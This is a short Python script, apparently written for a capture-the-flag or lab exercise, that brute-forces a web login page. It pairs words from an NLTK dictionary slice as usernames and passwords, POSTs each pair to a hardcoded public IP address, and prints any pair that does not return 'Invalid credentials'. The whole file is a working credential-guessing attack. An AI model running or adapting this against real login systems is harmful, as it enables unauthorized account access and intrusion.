import requests
import nltk
nltk.download('words')
from nltk.corpus import words




#word range printed in start message and start/b3dict.txt
creds = words.words()[81003:81024]

#url='http://YOUR_INTERNAL_IP:PORT/login'
#url='http://10.138.0.42/login'
url='http://35.247.73.157/login'


for u in creds:
	for p in creds:
		#two name attributes of input elements
		payload={'username':u,'password':p}
		post=requests.Session().post(url, data=payload)
		if 'Invalid credentials' not in  post.text:
			#print valid username and password
			print(u+' '+p )


